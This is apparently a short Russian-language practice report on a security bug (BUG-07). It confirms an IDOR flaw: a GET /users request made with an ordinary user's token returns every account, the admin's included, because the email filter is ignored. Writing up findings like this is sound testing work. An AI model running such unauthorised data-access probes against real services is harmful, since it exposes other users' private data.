# Практика 3 — IDOR (BUG-07)

## Запрос
GET /users?email=admin@example.com
Authorization: Bearer <токен_user>

## Результат
[
  {"email":"user@example.com","id":1,"name":"Test User"},
  {"email":"admin@example.com","id":2,"name":"Admin"},
  {"email":"newuser@example.com","id":3,"name":"New User"},
  ...
]

## Вывод
IDOR подтверждён. Пользователь `user` видит данные всех пользователей,
включая `admin`. Параметр `email` не фильтрует — API отдаёт всё.
Это BUG-07 (High, нарушение приватности).
